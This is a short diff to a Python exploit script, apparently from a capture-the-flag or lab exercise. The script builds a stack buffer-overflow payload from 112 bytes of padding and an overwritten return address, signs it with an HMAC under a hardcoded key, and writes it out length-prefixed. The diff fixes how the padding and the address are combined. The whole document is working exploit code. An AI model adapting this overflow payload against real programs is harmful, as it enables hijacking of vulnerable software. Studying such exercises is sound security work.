@@ -19,7 +19,7 @@ padding = b'A' * 112
 
 data = padding + bytes.fromhex("080496d7")
 
-data2 = (112 + 0x080496d7).to_bytes(4,'little')
+data2 = padding + (0x080496d7).to_bytes(4,'little')
 
 mac_addy = hmac.new(bytes.fromhex("fd35144ef39207ab0882ae7a1d9db00b4f68778d715b6999bb53d149190388d4"), data2, hashlib.sha256)
 sys.stdout.buffer.write(len(data2).to_bytes(4, 'little') + data2 + mac_addy.digest())
